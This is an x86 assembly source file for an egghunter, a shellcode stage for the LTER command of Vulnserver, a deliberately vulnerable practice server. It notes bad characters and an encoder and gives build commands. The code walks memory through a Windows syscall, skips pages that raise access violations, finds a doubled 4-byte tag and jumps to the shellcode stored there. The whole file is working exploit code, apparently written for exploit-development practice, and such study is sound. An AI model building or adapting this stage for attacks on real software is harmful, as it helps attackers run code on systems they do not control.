; egghunter for Vulnserver::LTER
; badchars: \x00, \x80-\xff
;   not able to omit, hence, will need to encode with Slink
; TAG: "\xFF\xFE\xFD\xFC"
;
; nasm -f bin egghunter.asm
; xxd -p egghunter

[bits 32]

start:
loop_inc_page:
    or dx, 0fffh
    
loop_inc_addr:
    inc edx

loop_check:
    push edx
    push 2
    pop eax
    int 2eh
    pop edx
    cmp al, 5 ; 0xC0000005 is ACCESS_VIOLATION
    je loop_inc_page ; no access, try next page

    mov eax, 0fcfdfeffh ; TAG
    mov edi, edx
    scasd   ; compare with first TAG
    jnz loop_inc_addr ; if not equal, try next address
    scasd   ; compare again
    jnz loop_inc_addr

    mov eax, edi
    jmp eax ; jmp to shellcode
